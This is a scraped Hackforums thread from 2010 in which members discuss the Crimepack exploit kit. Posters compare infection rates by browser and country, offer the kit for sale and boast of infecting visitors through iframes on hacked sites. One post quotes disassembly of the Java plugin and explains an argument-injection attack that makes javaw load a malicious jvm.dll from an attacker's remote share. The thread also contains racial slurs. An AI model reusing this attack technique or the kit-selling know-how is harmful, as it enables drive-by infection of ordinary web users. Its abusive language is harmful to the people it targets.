Thread ID,Comment Link,Floor Number,Username,Timestamp,Trade,Review,Q&A,Self-Promotion,Content,,,,,
23,https://hackforums.net/showthread.php?tid=520938&page=3,39,crimepack,"07-05-2010, 05:48 PM",0,0,1,0,"(07-05-2010, 05:39 PM)killer187 Wrote: If that Clay Davis is legit, that's insane that you're getting >30% load rates on exploits that aren't private. you gotta grab em while they are hot, the high rates are thanks to the stupidity of the people behind Java Quote:Bye bye my little 0day :(, Tavis Ormandy did a great job uncovering a big logic flaw within Java JRE. I discovered that bug and other that affects every browser few weeks ago and I posted the common ""0day++"" tweet. The method in which Java Web Start support has been added to the JRE is not less than a deliberately embedded backdoor(I really don't think so) or a flagrant case of extreme negligence (+1). Let's see: Java Plugin for Browsers (Chrome,Firefox...) - Windows: npjp2.dll (The same for IE8's jp2iexp.dll) .text:6DAA3D96 .text:6DAA3D96 ; == S U B R O U T I N E == .text:6DAA3D96 .text:6DAA3D96 ; Attributes: bp-based frame .text:6DAA3D96 .text:6DAA3D96 sub_6DAA3D96 proc near ; CODE XREF: sub_6DAA2ACB+170p .text:6DAA3D96 .text:6DAA3D96 Data = byte ptr -264h .text:6DAA3D96 var_263 = byte ptr -263h .text:6DAA3D96 ApplicationName = byte ptr -160h .text:6DAA3D96 StartupInfo = _STARTUPINFOA ptr -5Ch .text:6DAA3D96 ProcessInformation= _PROCESS_INFORMATION ptr -18h .text:6DAA3D96 cbData = dword ptr -8 .text:6DAA3D96 hKey = dword ptr -4 .text:6DAA3D96 arg_0 = dword ptr 8 .text:6DAA3D96 arg_4 = dword ptr 0Ch .text:6DAA3D96 .text:6DAA3D96 push ebp .text:6DAA3D97 mov ebp, esp .text:6DAA3D99 sub esp, 264h .text:6DAA3D9F push edi .text:6DAA3DA0 lea eax, [ebp+hKey] .text:6DAA3DA3 push eax ; phkResult .text:6DAA3DA4 push 20019h ; samDesired .text:6DAA3DA9 xor edi, edi .text:6DAA3DAB push edi ; ulOptions .text:6DAA3DAC push offset SubKey ; ""JNLPFile\\Shell\\Open\\Command"" .text:6DAA3DB1 push 800h ; hKey .text:6DAA3DB6 mov [ebp+cbData], 104h .text:6DAA3DBD call ds:RegOpenKeyExA .text:6DAA3DC3 test eax, eax .text:6DAA3DC5 jz short loc_6DAA3DCE .text:6DAA3DC7 xor eax, eax .text:6DAA3DC9 jmp loc_6DAA3F16 The default handler is ""javaws.exe"",continuing... .text:6DAA3EB7 push [ebp+arg_4] .text:6DAA3EBA push eax .text:6DAA3EBB push offset aSDocbaseSS ; ""\""%s\"" -docbase %s %s"" .text:6DAA3EC0 push esi ; LPSTR .text:6DAA3EC1 call ebx ; wsprintfA .text:6DAA3EC3 add esp, 14h .text:6DAA3EC6 jmp short loc_6DAA3ED4 .text:6DAA3EC8 ; -- .text:6DAA3EC8 .text:6DAA3EC8 loc_6DAA3EC8: ; CODE XREF: sub_6DAA3D96+11Fj .text:6DAA3EC8 push eax .text:6DAA3EC9 push offset aSS_0 ; ""\""%s\"" %s"" .text:6DAA3ECE push esi ; LPSTR .text:6DAA3ECF call ebx ; wsprintfA .text:6DAA3ED1 add esp, 10h .text:6DAA3ED4 .text:6DAA3ED4 loc_6DAA3ED4: ; CODE XREF: sub_6DAA3D96+130j .text:6DAA3ED4 push 11h .text:6DAA3ED6 pop ecx .text:6DAA3ED7 xor eax, eax .text:6DAA3ED9 lea edi, [ebp+StartupInfo] .text:6DAA3EDC rep stosd .text:6DAA3EDE lea eax, [ebp+ProcessInformation] .text:6DAA3EE1 push eax ; lpProcessInformation .text:6DAA3EE2 xor ebx, ebx .text:6DAA3EE4 lea eax, [ebp+StartupInfo] .text:6DAA3EE7 push eax ; lpStartupInfo .text:6DAA3EE8 push ebx ; lpCurrentDirectory .text:6DAA3EE9 push ebx ; lpEnvironment .text:6DAA3EEA push ebx ; dwCreationFlags .text:6DAA3EEB push ebx ; bInheritHandles .text:6DAA3EEC push ebx ; lpThreadAttributes .text:6DAA3EED push ebx ; lpProcessAttributes .text:6DAA3EEE push esi ; lpCommandLine .text:6DAA3EEF lea eax, [ebp+ApplicationName] .text:6DAA3EF5 push eax ; lpApplicationName .text:6DAA3EF6 mov [ebp+StartupInfo.cb], 44h .text:6DAA3EFD call ds:CreateProcessA So basically the Java-Plugin Browser is running ""javaws.exe"" without validating command-line parameters. These parameters can be controlled by attackers via specially crafted embed html tags within a webpage. Let's see JavaDeploy.txt: if (browser == 'MSIE') { document.write('<' + 'object classid=""clsid:8AD9C840-044E-11D1-B3E9-00805F499D93"" ' + 'width=""0"" height=""0"">' + '<' + 'PARAM name=""launchjnlp"" value=""' + jnlp + '""' + '>' + '<' + 'PARAM name=""docbase"" value=""' + jnlpDocbase + '""' + '>' + '<' + '/' + 'object' + '>'); } else if (browser == 'Netscape Family') { document.write('<' + 'embed type=""application/x-java-applet;jpi-version=' + deployJava.firefoxJavaVersion + '"" ' + 'width=""0"" height=""0"" ' + 'launchjnlp=""' + jnlp + '""' + 'docbase=""' + jnlpDocbase + '""' + ' />'); } That's it. This is how JAVA Plugin identifies Java Web Start content (jnlp files).So We can inject command-line parameters through ""docbase"" tag and even ""launchjnlp"". What type of arguments can we abuse to compromise a system? java.exe and javaw.exe support an undocumented-hidden command-line parameter ""-XXaltjvm"" and curiosly also ""-J-XXaltjvm"" (see -J switch in javaws.exe). This instructs Java to load an alternative JavaVM library (jvm.dll or libjvm.so) from the desired path. Game over. We can set -XXaltjvm=\\IP\evil , in this way javaw.exe will load our evil jvm.dll. Bye bye ASLR, DEP... Linux Same logic _error_, check this function ""_Z10launchJNLPPKcS0"" in libnpjp2.so MACOSX Not vulnerable. Workaround Disable javaws/javaws.exe in linux and Windows by any mean. Disable Deployment Toolkit to avoid unwanted installation as stated in Tavis' advisory.",,,,,
23,https://hackforums.net/showthread.php?tid=520938&page=3,40,subwar,"07-05-2010, 05:48 PM",0,0,1,0,honestly I don't know why people are flaming you crimepack. you might as well stop trying to talk to these thick headed skids. sucks that you had to leak it,,,,,
23,https://hackforums.net/showthread.php?tid=520938&page=3,41,crimepack,"07-05-2010, 05:51 PM",0,0,1,0,"(07-05-2010, 05:48 PM)subwar Wrote: honestly I don't know why people are flaming you crimepack. you might as well stop trying to talk to these thick headed skids. sucks that you had to leak it i password protected it incase i changed my mind, i leaked it basicly just to take the glory away from the person that wanted to leak it, though after some discussions with him he changed his mind and decided not to leak it, so no harm has been done besides him giving away some incomplete copies to his friends",,,,,
23,https://hackforums.net/showthread.php?tid=520938&page=3,42,DrugsAnyone?,"07-05-2010, 05:58 PM",0,0,1,0,"(07-05-2010, 05:48 PM)subwar Wrote: honestly I don't know why people are flaming you crimepack. you might as well stop trying to talk to these thick headed skids. sucks that you had to leak it I know why people flame you. Trying to act all cool with your Local Windows NT Kernel Exploit. @Crime I'm not sure, as i don't ever get into the exploit pack field (Can't code a exploit, and can't get my hands on a private/semi private pack) if the exploits are based on us rate or global rate. I'm simply saying that judging by these <= Link stat's You're only getting a 18% success rate. And In your thread you said you had a 30% success rate. And posted these Code Internet Explorer 6 & 7 - 39% Firefox - 14% Opera - 6% Overall Rate: 30% Rate Countries: US: 14% UK: 7% IN: 38% DE: 16% TR: 22% IT: 18% AU: 11% Together you're getting 19.6%",,,,,
23,https://hackforums.net/showthread.php?tid=520938&page=3,43,crimepack,"07-05-2010, 06:02 PM",0,0,1,0,"(07-05-2010, 05:58 PM)DrugsAnyone? Wrote: I know why people flame you. Trying to act all cool with your Local Windows NT Kernel Exploit. @Crime I'm not sure, as i don't ever get into the exploit pack field (Can't code a exploit, and can't get my hands on a private/semi private pack) if the exploits are based on us rate or global rate. I'm simply saying that judging by these <= Link stat's You're only getting a 18% success rate. And In your thread you said you had a 30% success rate. And posted these Code Internet Explorer 6 & 7 - 39% Firefox - 14% Opera - 6% Overall Rate: 30% Rate Countries: US: 14% UK: 7% IN: 38% DE: 16% TR: 22% IT: 18% AU: 11% Together you're getting 19.6% as you can see on the screenshot, thats version 2.2.1 (3 months old) this is version 3.0 and also i believe local privilege escalation exploits are pretty cool",,,,,
23,https://hackforums.net/showthread.php?tid=520938&page=3,44,LARA_300,"07-05-2010, 06:06 PM",0,0,1,0,"(07-05-2010, 05:51 PM)crimepack Wrote: i password protected it incase i changed my mind, i leaked it basicly just to take the glory away from the person that wanted to leak it, though after some discussions with him he changed his mind and decided not to leak it, so no harm has been done besides him giving away some incomplete copies to his friends What if i want to buy it?",,,,,
23,https://hackforums.net/showthread.php?tid=520938&page=3,45,crimepack,"07-05-2010, 06:07 PM",0,0,1,0,"(07-05-2010, 06:06 PM)Sï¿__ï¿_ï¿_ï¿_ï¿__ï¿_Ó„ï¿_ Wrote: What if i want to buy it? then you can go ahead and contact me, i added you on msn earlier h@**",,,,,
23,https://hackforums.net/showthread.php?tid=520938&page=2,16,crimepack,"07-05-2010, 12:37 PM",0,0,1,0,"(07-05-2010, 11:48 AM)qwertylol Wrote: Good luck at decrypting it lmao, when you are done with decrypting, the exploits will be patched allready. there isn't any 0days in it, still gives a good 20-35% rate though so whoever is able to get the rar pass and fix the broken files, can profit from it :)",,,,,
23,https://hackforums.net/showthread.php?tid=520938&page=2,17,xXHestiaXx,"07-05-2010, 12:56 PM",0,0,1,0,i doubt anyone will find the pw,,,,,
23,https://hackforums.net/showthread.php?tid=520938&page=2,18,LARA_300,"07-05-2010, 12:58 PM",0,0,1,0,"(07-05-2010, 12:37 PM)crimepack Wrote: there isn't any 0days in it, still gives a good 20-35% rate though so whoever is able to get the rar pass and fix the broken files, can profit from it :) Oh, So first thing i have to do is: 1. Find right pass? Then: 2. Fix broken php files? Any Hintz? I was goin to buy it but u never respond DAMN PM's.",,,,,
23,https://hackforums.net/showthread.php?tid=520938&page=2,19,x32,"07-05-2010, 01:41 PM",0,0,1,0,"Can't be fugged brute-forcing today. NiggerPanel is better than Crimepack IMO. (07-04-2010, 09:55 PM)BlaiR Wrote: lol. Yeah As If A Kid You Could Hire A Private Exploit Pack :3Why The fugg Do You Type Like This?",,,,,
23,https://hackforums.net/showthread.php?tid=520938&page=2,20,wacked2,"07-05-2010, 02:43 PM",0,0,1,0,acurally the idea behind niggerpanel isnï¿_t that bad. i tried the same idea on 4chan and got 45 vics for posting a link and 3 pictures. Ok itï¿_s clearly not the best or fastest method but better than youtube spreading or what the people here actually do.,,,,,
23,https://hackforums.net/showthread.php?tid=520938&page=2,21,x32,"07-05-2010, 02:54 PM",0,0,1,0,"(07-05-2010, 02:43 PM)wacked2 Wrote: acurally the idea behind niggerpanel isnï¿_t that bad. i tried the same idea on 4chan and got 45 vics for posting a link and 3 pictures. Ok itï¿_s clearly not the best or fastest method but better than youtube spreading or what the people here actually do. NiggerPanel is mainly used for iframes on hacked sites. Had over 5k installs from it in the end... All gone now. Also, I lost all the code for it after a hardware fugg-up.",,,,,
23,https://hackforums.net/showthread.php?tid=520938&page=2,22,crimepack,"07-05-2010, 04:26 PM",0,0,1,0,"(07-05-2010, 01:41 PM)x32 Wrote: Can't be fugged brute-forcing today. NiggerPanel is better than Crimepack IMO. Why The fugg Do You Type Like This? so what exploits are you using in nlggerpanel? and how high exploitation rate? is it stealth? IE: 29550 (6716 loads) 23% FF: 22116 (3279 loads) 15% and this is on US traffic",,,,,
23,https://hackforums.net/showthread.php?tid=520938&page=2,23,tUSnipa,"07-05-2010, 04:41 PM",0,0,0,0,Sorry to hear about this crim.,,,,,
23,https://hackforums.net/showthread.php?tid=520938&page=2,24,DrugsAnyone?,"07-05-2010, 04:44 PM",0,0,1,0,"(07-04-2010, 10:12 PM)Georgia Wrote: heya (s)kid, learn 2 code, i created my own remote code execution exploit so stfu. (0day). L...M...F...A..O.. And what does it Sploit (s)kid? Neopets! WOW! You're an ub3r h4xz0r3! Gtfo you stupid peice of Clay Davis, you can't code fugg all and you act all hard. You're a dumbfuck, get a life and don't feel proud of 'Coding' *Cough* Re-naming *Cough* an already existent sploit. (07-05-2010, 04:26 PM)crimepack Wrote: so what exploits are you using in nlggerpanel? and how high exploitation rate? is it stealth? IE: 29550 (6716 loads) 23% FF: 22116 (3279 loads) 15% and this is on US traffic The combined exploit rate of your pack (From the Reviews on it) Your pack only gets 18% (Together) So don't feel like you're a god for posting your 23% and 15% (Which are good) when you're probably also sitting on Opera: 23718 (118 loads) 1% or something like that. kthnx.",,,,,
23,https://hackforums.net/showthread.php?tid=520938&page=2,25,killer187,"07-05-2010, 04:46 PM",0,0,1,0,"(07-05-2010, 04:44 PM)DrugsAnyone? Wrote: L...M...F...A..O.. And what does it Sploit (s)kid? Neopets! WOW! You're an ub3r h4xz0r3! Gtfo you stupid peice of Clay Davis, you can't code fugg all and you act all hard. You're a dumbfuck, get a life and don't feel proud of 'Coding' *Cough* Re-naming *Cough* an already existent sploit. Wow as much as I (kindof) agree with you, isn't your statement contradicting itself? You say he's not a good coder and can't use exploits, but you say get a life?",,,,,
23,https://hackforums.net/showthread.php?tid=520938&page=2,26,DrugsAnyone?,"07-05-2010, 04:47 PM",0,0,1,0,"(07-05-2010, 04:46 PM)killer187 Wrote: Wow as much as I (kindof) agree with you, isn't your statement contradicting itself? You say he's not a good coder and can't use exploits, but you say get a life? He needs to find other Clay Davis to do instead of act like a hardass on a internet forum, go out and talk Clay Davis like this in real life and watch as his ass gets curb stomped.",,,,,
23,https://hackforums.net/showthread.php?tid=520938&page=2,27,fiber,"07-05-2010, 04:48 PM",0,0,1,0,"(07-05-2010, 04:46 PM)killer187 Wrote: Wow as much as I (kindof) agree with you, isn't your statement contradicting itself? You say he's not a good coder and can't use exploits, but you say get a life?nope, hes calling him a ripper only",,,,,
23,https://hackforums.net/showthread.php?tid=520938&page=2,28,401K,"07-05-2010, 04:48 PM",1,0,0,0,Soo no password yet? =/ Crimepack if your still selling please respond on MSN i'm interested.,,,,,
23,https://hackforums.net/showthread.php?tid=520938&page=2,29,x32,"07-05-2010, 04:52 PM",0,0,1,0,"(07-05-2010, 04:26 PM)crimepack Wrote: so what exploits are you using in nlggerpanel? and how high exploitation rate? is it stealth? IE: 29550 (6716 loads) 23% FF: 22116 (3279 loads) 15% and this is on US trafficBasically it's just a few exploits I grabbed off exploit-db, milw0rm and other databases and compiled, as well as pure willpower. If that fails, it just tempts them to run a Java applet. I haven't used it in ages, because I simply don't have it anymore.",,,,,
23,https://hackforums.net/showthread.php?tid=520938&page=2,30,crimepack,"07-05-2010, 04:54 PM",0,0,1,0,"(07-05-2010, 04:44 PM)DrugsAnyone? Wrote: L...M...F...A..O.. And what does it Sploit (s)kid? Neopets! WOW! You're an ub3r h4xz0r3! Gtfo you stupid peice of Clay Davis, you can't code fugg all and you act all hard. You're a dumbfuck, get a life and don't feel proud of 'Coding' *Cough* Re-naming *Cough* an already existent sploit. (07-05-2010, 04:26 PM)crimepack Wrote: so what exploits are you using in nlggerpanel? and how high exploitation rate? is it stealth? IE: 29550 (6716 loads) 23% FF: 22116 (3279 loads) 15% and this is on US traffic The combined exploit rate of your pack (From the Reviews on it) Your pack only gets 18% (Together) So don't feel like you're a god for posting your 23% and 15% (Which are good) when you're probably also sitting on Opera: 23718 (118 loads) 1% or something like that. kthnx. i didn't bother posting the Opera stats because it only had 500 hits, but here it is anyways 569 (103 loads) 18% and is 18% bad on a exploit pack suddenly? last time i checked Yes Exploit System (costs $1200) got 3-4% rate overall on US traffic, without 0days you won't reach much higher rates, and i wouldn't include 0days worth 10k$+ in a pack for $400, would i? anyways i can guarantee that i can code better Clay Davis than you (besides my primary language is C & C++, this is just a side project that is supposed to be combined with my bot, and you are a .NET coder, i wonder who the script kiddie is really) and what 'existant' exploit would i be renaming? as far as im concerned i left the CVE numbers intact for the exploit definitions, didn't i? (07-05-2010, 04:52 PM)x32 Wrote: Basically it's just a few exploits I grabbed off exploit-db, milw0rm and other databases and compiled, as well as pure willpower. If that fails, it just tempts them to run a Java applet. I haven't used it in ages, because I simply don't have it anymore. and how would that be better than this pack? i assume you didn't modify the exploit, adjust the spraying to make the exploits more reliable, java applet in iframes is pretty bad though unless you wan't your iframes to be removed quickly, in my opinon its only good if you iframe landing pages",,,,,
